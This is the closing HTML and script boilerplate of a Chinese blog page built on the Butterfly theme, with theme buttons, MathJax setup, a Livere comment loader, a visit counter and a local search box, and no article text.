id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/B1og/js/utils.js"></script><script src="/B1og/js/main.js"></script><script src="/B1og/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [['$', '$'], ['\\(', '\\)']],
      tags: 'ams'
    },
    chtml: {
      scale: 1.1
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, '']
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typesetPromise()
}</script><script>function loadLivere () {
  if (typeof LivereTower === 'object') {
    window.LivereTower.init()
  }
  else {
    (function(d, s) {
        var j, e = d.getElementsByTagName(s)[0];
        if (typeof LivereTower === 'function') { return; }
        j = d.createElement(s);
        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
        j.async = true;
        e.parentNode.insertBefore(j, e);
    })(document, 'script');
  }
}

if ('Livere' === 'Livere' || !false) {
  if (false) btf.loadComment(document.getElementById('lv-container'), loadLivere)
  else loadLivere()
}
else {
  function loadOtherComment () {
    loadLivere()
  }
}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/B1og/js/search/local-search.js"></script></div></div></body></html>